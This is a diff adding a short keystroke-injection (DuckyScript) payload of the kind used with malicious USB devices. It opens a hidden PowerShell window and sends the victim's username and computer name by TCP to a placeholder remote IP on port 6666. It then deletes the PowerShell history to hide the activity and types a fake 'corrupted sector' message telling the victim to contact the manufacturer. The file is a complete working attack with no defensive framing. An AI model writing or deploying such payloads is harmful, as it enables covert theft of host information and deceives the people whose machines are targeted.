@@ -1,0 +1,21 @@
+DELAY 250
+GUI r
+DELAY 250
+STRING powershell -Windowstyle Hidden
+ENTER
+DELAY 300
+STRING $data=[System.Text.Encoding]::ASCII.GetBytes("Username:$env:username---Computer:$env:computername");(new-object System.Net.Sockets.TcpClient('<RemoteIp>',6666)).GetStream().Write($data,0,$data.Length);
+ENTER
+DELAY 300
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath
+ENTER
+DELAY 300
+STRING exit
+ENTER
+DELAY 300
+GUI r
+DELAY 250
+STRING cmd
+ENTER
+DELAY 400
+STRING This disk has a corrupted sector.  Please contact the manufacturer for further instruction.
